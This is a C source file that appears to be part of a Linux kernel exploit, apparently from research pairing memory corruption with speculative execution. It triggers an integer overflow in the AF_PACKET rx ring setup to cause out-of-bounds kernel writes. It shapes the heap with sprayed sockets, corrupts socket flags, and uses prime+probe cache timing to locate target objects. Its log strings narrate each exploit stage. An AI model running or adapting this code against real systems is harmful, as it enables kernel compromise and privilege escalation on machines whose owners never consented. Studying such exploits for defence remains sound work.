void * get_sock_addr(int s);

#include "memwrite.h"
#include "llc_prime_probe.h"
#include "memprep.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/mman.h>
#include <linux/if_packet.h>

#define KMALLOC_PAD		512
#define PAGEALLOC_PAD		1024

rxring_socket* offset_writer = NULL;
rxring_socket* arb_mem_writer = NULL;

int create_socket_p_arp() {
  int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
  if (s < 0) {
    perror("[-] socket(AF_PACKET..P_ARP)");
    exit(EXIT_FAILURE);
  }
  return s;
}

int create_socket_p_all() {
  int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (s < 0) {
    perror("[-] socket(AF_PACKET..P_ALL)");
    exit(EXIT_FAILURE);
  }
  return s;
}

int create_socket_p_raw() {
  int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
  if (s < 0) {
    perror("[-] socket(AF_PACKET..RAW)");
    exit(EXIT_FAILURE);
  }
  return s;
}

void bind_socket(int s) {
  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_family = PF_PACKET;
  sa.sll_protocol = htons(ETH_P_ALL);
  sa.sll_ifindex = if_nametoindex("lo");
  sa.sll_hatype = 0;
  sa.sll_pkttype = 0;
  sa.sll_halen = 0;

  int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
  if (rv < 0) {
    perror("[-] bind(AF_PACKET)");
    exit(EXIT_FAILURE);
  }
}

int packet_sock_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

rxring_socket* create_rxring_socket() {
  rxring_socket* rs = malloc(sizeof(rxring_socket));

  rs->sockfd = -1;
  rs->map = NULL;
  rs->iov = NULL;
  rs->block_size = 0;
  rs->num_blocks = 0;

  return rs;
}

void close_rxring_socket(rxring_socket* rs) {
  if (rs->num_blocks > 0) {
    if (munmap(rs->map, rs->block_size * rs->num_blocks)) {
      perror("munmap");
      exit(EXIT_FAILURE);
    }
    free(rs->iov);
    rs->block_size = 0;
    rs->num_blocks = 0;
  }

  close(rs->sockfd);

  free(rs);
}

void create_iov(rxring_socket* rs, size_t block_size, int num_blocks) {
  int i;

  rs->map = mmap(NULL, block_size * num_blocks, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_LOCKED, rs->sockfd, 0);
  if (rs->map == MAP_FAILED) {
    perror("mmap");
    exit(1);
  }

  rs->iov = malloc(num_blocks * sizeof(struct iovec));
  if (rs->iov == NULL) {
    printf("malloc failed\n");
    exit(1);
  }
  for (i = 0; i < num_blocks; ++i) {
    rs->iov[i].iov_base = rs->map + (i * block_size);
    rs->iov[i].iov_len = block_size;
  }

  rs->block_size = block_size;
  rs->num_blocks = num_blocks;
}

// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *

void packet_socket_rx_ring_init(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {

	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;

	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ARP);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))

#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))

#define ETH_HDR_LEN	sizeof(struct ethhdr)
#define IP_HDR_LEN	sizeof(struct iphdr)
#define UDP_HDR_LEN	sizeof(struct udphdr)

#define UDP_HDR_LEN_FULL	(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)

unsigned int calc_sizeof_priv(int offset) {
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	unsigned int macoff = netoff - maclen;
	unsigned int sizeof_priv = 0x8000 - BLK_HDR_LEN - macoff + offset;
  return sizeof_priv;
}

unsigned int calc_sizeof_priv_vuln(int offset) {
	return (1u<<31) + (1u<<30) + calc_sizeof_priv(offset);
}

int oob_setup(int offset) {
  unsigned int sizeof_priv = calc_sizeof_priv_vuln(offset);
	return packet_socket_setup(0x8000, 2048, 2, sizeof_priv, 100);
}

// * * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * *

void kmalloc_pad(int count) {
	int i;
	for (i = 0; i < count; i++)
		packet_sock_kmalloc();
}

void pagealloc_pad(int count) {
	packet_socket_setup(0x8000, 2048, count, 0, 100);
}

int gap_filling_sockets[GSOCKETS];
rxring_socket* cand_arb_mem_writers[FSOCKETS];
int specex_candidate_sockets[FSOCKETS][SSOCKETS];
int arb_mem_writer_idx = -1;
int curr_specex_socket = -1;
int specex_socket_first = -1;
int specex_socket_second = -1;
int specex_sockets_evicset_idx = -1; // for flag eviction in co-thread

void prepare_memory_layout(){
  int i, j;

  // Create sockets of which the ring buffers will re-align the vulnerable buffers
  // to the same offset in the 256kb slots that can hold 8 ring buffers of size 0x8000.
  for (i = 0; i < GSOCKETS; ++i) {
    gap_filling_sockets[i] = create_socket_p_arp();
  }

  kmalloc_pad(KMALLOC_PAD);
  pagealloc_pad(PAGEALLOC_PAD);

  // Create socket that will corrupt 'write offset' in sockets doing non-linear out-of-bound writes.
  offset_writer = create_rxring_socket();
  offset_writer->sockfd = oob_setup(0x800 + SIZEOF_PRIV_OFFSET - 12);
  create_iov(offset_writer, 0x8000, 2); // map rx ring of offset writing socket

  // Create socket candidates of which one will perform non-linear out-of-bound writes.
  for (i = 0; i < FSOCKETS; ++i) {
    cand_arb_mem_writers[i] = create_rxring_socket();
    cand_arb_mem_writers[i]->sockfd = create_socket_p_all();
  }

  // Create socket candidates that we might use for speculative execution.
  for (i = 0; i < FSOCKETS; ++i) {
    //***** GAP *****
    // align rx ring buffer blocks by filling gaps
    packet_socket_rx_ring_init(gap_filling_sockets[i], 0x8000, 2048, 4, 0, 100);
    // bind gap filling sockets
    bind_socket(gap_filling_sockets[i]);

    //***** FPTR *****
    // assign rx ring buffer with oob property to a fptr writing socket
    unsigned int sizeof_priv = calc_sizeof_priv_vuln(0x800 - 0x10); // oob pointing to empty location
    packet_socket_rx_ring_init(cand_arb_mem_writers[i]->sockfd, 0x8000, 2048, 2, sizeof_priv, 100);
    // bind fptr writing sockets
    bind_socket(cand_arb_mem_writers[i]->sockfd);

    // map rx ring of corrupted fptr socket
    create_iov(cand_arb_mem_writers[i], 0x8000, 2);

    //***** SPECEX *****
    // create 32 specex socket candidates
    for (j = 0; j < SSOCKETS; ++j) {
      specex_candidate_sockets[i][j] = create_socket_p_raw();
    }
  }

  // enable position updater
  bind_socket(offset_writer->sockfd);

#if DEBUGGING
  printf("[D] 'position' updating socket @ 0x%lx\n", (unsigned long) get_sock_addr(offset_writer->sockfd));
#endif

  printf("\n[.] arranged memory layout (including socket object with vulnerable buffer and other temporary socket objects)\n");
  sleep(1);
}

int poke_socket_object_check_cacheset_signal_pp(int sockfd, int level, int optname, int evicset_idx, int cacheset_idx, int num_execs, int min_evicts) {
  char buffer[32];
  int size = sizeof(buffer);
  int x, evicts = 0;

  for(x = 0; x < num_execs; x++) {
    pp_prime_cacheset(evicset_idx, cacheset_idx);
    getsockopt(sockfd, level, optname, buffer, &size);
    if (pp_probe_cacheset_access_time(evicset_idx, cacheset_idx) > 310) {
      evicts += 1;
      if (evicts == min_evicts) {
        return 1;
      }
    }
  }

  return 0;
}

#define NUM_STAGES_SOCKFD_SEARCH 12
int test_candidate_sockfd_search(int sockfd, int page_half, int evicset_idx, int stage) {
  int num_execs = 40;
  int success = -1;

  // We test cachelines in the upper 0x800 block of a page,
  // because we target that block with the out of bound writes.
#define SOCKFD_SEARCH_EVAL_THRESHOLD 0.9
  switch (stage) {
    // SOL_SOCKET options
    case 0:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_SOCKET, SO_DOMAIN, evicset_idx, 0 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 1:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_SOCKET, SO_DEBUG, evicset_idx, 1 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 2:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_SOCKET, SO_RCVBUF, evicset_idx, 3 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 3:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_SOCKET, SO_SNDBUF, evicset_idx, 4 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 4:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_SOCKET, SO_MAX_PACING_RATE, evicset_idx, 5 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 5:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_SOCKET, SO_ERROR, evicset_idx, 6 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 6:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_SOCKET, SO_MARK, evicset_idx, 7 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 7:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_SOCKET, SO_TIMESTAMPING, evicset_idx, 8 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;

      // SOL_PACKET options
    case 8:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_PACKET, PACKET_FANOUT, evicset_idx, 11 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 9:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_PACKET, PACKET_AUXDATA, evicset_idx, 19 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 10:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_PACKET, PACKET_STATISTICS, evicset_idx, 2 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      success *= poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_PACKET, PACKET_STATISTICS, evicset_idx, 11 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      success *= poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_PACKET, PACKET_STATISTICS, evicset_idx, 19 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;
    case 11:
      success = poke_socket_object_check_cacheset_signal_pp(sockfd, SOL_PACKET, PACKET_LOSS, evicset_idx, 20 + 32*page_half, num_execs, (int) (num_execs * SOCKFD_SEARCH_EVAL_THRESHOLD));
      break;

    default:
      printf("[-] Unexpected! unknown stage.. func args(%d, %d)\n", evicset_idx, stage);
      exit(0);
  }

  if (success < 0) {
    printf("[-] Broken switch (sockfd evicset idx search), success < 0 (%d)\n", success);
    exit(1);
  }

  return success;
}

#define NUM_EVICSETS 128
int get_sockfd_evicset_idx(int sockfd, int page_half) {
  int i;
  int num_candidates = NUM_EVICSETS;
  int candidates[NUM_EVICSETS];

  for (i = 0; i < NUM_EVICSETS; i++) {
    candidates[i] = 1; // set all indices as candidates
  }

  int num_stages_remaining = NUM_STAGES_SOCKFD_SEARCH;
  while (num_candidates > 1 && num_stages_remaining > 0) {
    num_stages_remaining -= 1;
    for (i = 0; i < NUM_EVICSETS; i++) {
      if (candidates[i] != 1) {
        continue;
      }

      int good_candidate = test_candidate_sockfd_search(sockfd, page_half, i, num_stages_remaining);
      if (!good_candidate) {
        num_candidates -= 1;
        candidates[i] = 0;
      }
    }

#if DEBUGGING
    printf("[D] @ stage:%d num_candidates:%d\n", num_stages_remaining, num_candidates);
#endif
  }

  if (num_candidates != 1) {
    printf("[-] Went through all stages to find sockfd evicset idx but failed..\n");
    exit(1);
  }

  // assert found evicset idx is right
  int evicset_idx = -1;
  for (i = 0; i < NUM_EVICSETS; i++) {
    if (candidates[i] == 1) {
      evicset_idx = i;
      break;
    }
  }

  if (evicset_idx == -1) {
    printf("[-] Could not find sockfd evicset idx. exiting..\n");
    exit(1);
  }

  return evicset_idx;
}

void find_specex_sockets_evicset_idx() {
  specex_sockets_evicset_idx = get_sockfd_evicset_idx(specex_socket_second, 1);
}

void find_specex_cand_objects_and_evicset_idxs() {
  int i;

  // *** Find specex_socket and its corresponding evicset idx
  // Look for socket that has SO_DEBUG flag set.

  // overwrite flags:
  // - SOCK_ZAPPED            0x0100 // set by default
  // - SOCK_USE_WRITE_QUEUE   0x0200 // corrupted to enable spec.exec. with the socket
  // - SOCK_DBG               0x0400 // corrupted to find our spec.exec. socket

  set_arb_mem_writer_pos(0x000 + SKC_FLAGS_OFFSET - 40); // change offset in fptr_writer socket
  write_skc_flags(0x0700); // overwrite flag of a specex socket

  for (i = 0; i < SSOCKETS; ++i) {
    int sockfd = specex_candidate_sockets[arb_mem_writer_idx][i];

    int so_dbg = 0;
    socklen_t so_dbg_len = sizeof(so_dbg);
    if (getsockopt(sockfd, SOL_SOCKET, SO_DEBUG, &so_dbg, &so_dbg_len) < 0) {
      perror("getsockopt");
      exit(1);
    }

#if DEBUGGING
    printf("[D] socket-idx:%d so_dbg:%d\n", i, so_dbg);
#endif
    if (so_dbg == 1) {
      specex_socket_first = sockfd;
      break;
    }
  }

  // Find the object starting at page offset 0x800
  set_arb_mem_writer_pos(0x800 + SKC_FLAGS_OFFSET - 40); // change offset in fptr_writer socket
  write_skc_flags(0x0700); // overwrite flag of a specex socket

  for (i = 0; i < SSOCKETS; ++i) {
    int sockfd = specex_candidate_sockets[arb_mem_writer_idx][i];
    if (sockfd == specex_socket_first) continue;

    int so_dbg = 0;
    socklen_t so_dbg_len = sizeof(so_dbg);
    if (getsockopt(sockfd, SOL_SOCKET, SO_DEBUG, &so_dbg, &so_dbg_len) < 0) {
      perror("getsockopt");
      exit(1);
    }

#if DEBUGGING
    printf("[D] socket-idx:%d so_dbg:%d\n", i, so_dbg);
#endif
    if (so_dbg == 1) {
      specex_socket_second = sockfd;
      break;
    }
  }

  printf("[.] found speculative execution socket objects corruptible with the non-linear out-of-bound writes\n");
  printf("[.] prepared speculative execution socket objects by flipping (corrupting) their conditional branch flag\n");
#if DEBUGGING
  printf("[D] specex socket (page_offset=0x000): kaddr: %p\n", get_sock_addr(specex_socket_first));
  printf("[D] specex socket (page_offset=0x800): kaddr: %p\n", get_sock_addr(specex_socket_second));
#endif

  // seek for the evicset idx..
  find_specex_sockets_evicset_idx();
  printf("[.] found eviction set corresponding to the speculative execution sockets\n");

  curr_specex_socket = specex_socket_second;
#if DEBUGGING
  printf("[D] specex socket (page_offset=0x000): kaddr: %p\n", get_sock_addr(specex_socket_first));
  printf("[D] specex socket (page_offset=0x800): kaddr: %p\n", get_sock_addr(specex_socket_second));
#endif
}

// For the exploit we need the following items:
// - offset_writer (already set when memory layout is prepared)
// - arb_mem_writer
// - specex_socket and corresponding evicset_idx
void find_necessary_items() {
  int i;

  // *** Find arb_mem_writer
  // Look for socket with corrupted stats.
  // Stats get corrupted when offset is updated.
  set_arb_mem_writer_pos(0x800 - 0x10); // prevent fptr writing socket from overwriting specex socket already
  sleep(1);

  for (i = 0; i < FSOCKETS; ++i) {
    struct tpacket_stats_v3 stats;
    socklen_t len = sizeof(stats);
    int err = getsockopt(cand_arb_mem_writers[i]->sockfd, SOL_PACKET, PACKET_STATISTICS, &stats, &len);
    if (err < 0) {
      perror("getsockopt");
      exit(1);
    }

#if DEBUGGING
    printf("[D] socket-idx:%d, received %u packets, %u dropped, freeze_q_cnt: %u\n", i,
        stats.tp_packets, stats.tp_drops,
        stats.tp_freeze_q_cnt);
#endif

    if (stats.tp_packets > 100) {
      arb_mem_writer = cand_arb_mem_writers[i];
      arb_mem_writer_idx = i;
      break;
    }
  }

  if (!arb_mem_writer) {
    printf("[-] could not find corrupted fptr socket, exiting..\n");
    exit(0);
  }
  printf("[.] found socket object whose 'fixed' write offset gets corrupted to enable non-linear out-of-bound writes\n");
#if DEBUGGING
  printf("[D] (idx: %d, kaddr: %p)\n", arb_mem_writer_idx, get_sock_addr(arb_mem_writer->sockfd));
#endif
  sleep(1);

  find_specex_cand_objects_and_evicset_idxs();
}

void free_unneeded_objects() {
  int i, j;

  printf("\n[.] freeing unnecessary objects..\n");

  // - fptr writers
  for (i = 0; i < FSOCKETS; ++i) {
    if (i == arb_mem_writer_idx) continue;

    close_rxring_socket(cand_arb_mem_writers[i]);
    cand_arb_mem_writers[i] = NULL;

    for (j = 0; j < SSOCKETS; ++j) {
      close(specex_candidate_sockets[i][j]);
    }
  }

  // - gaps
  for (i = 0; i < GSOCKETS; ++i) {
    if (close(gap_filling_sockets[i])) {
      perror("close");
      exit(EXIT_FAILURE);
    }
  }
  sleep(1);

  printf("[.] freeing unnecessary objects.. DONE\n");
}

